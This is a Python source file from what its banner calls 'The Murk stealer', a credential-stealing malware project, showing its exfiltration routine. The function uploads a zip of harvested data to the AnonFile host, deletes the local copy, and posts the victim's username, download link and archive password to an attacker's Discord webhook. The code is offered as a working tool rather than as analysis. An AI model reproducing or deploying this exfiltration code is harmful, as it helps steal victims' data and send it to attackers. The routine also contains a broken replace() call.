#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
from discord_webhook import DiscordWebhook, DiscordEmbed
from anonfile import AnonFile
import os


def Send(urlWebHook,botName,np):

	try:
		user = os.environ['USERPROFILE'].replace("C\\Users\\")
	except:
		PCuser = os.environ['USERPROFILE']
		file = AnonFile()
		try: 
			upload = file.upload(rf'{np[0]}.zip', progressbar=True)
		except Exception as e:
			print(e)
		try:
			os.remove(f'{np[0]}.zip')
			pass
		except Exception as e:
			print(e)
		url = upload.url.geturl()
		print(url)
		message = f'User: {PCuser}\nLink: {url}\nPassword: {np[1]}\n@everyone'
		hook = DiscordWebhook(url=urlWebHook, username=botName,content='**The Murk results**')
		embed =DiscordEmbed(title=message, color = 242424)
		hook.add_embed(embed)
		response = hook.execute()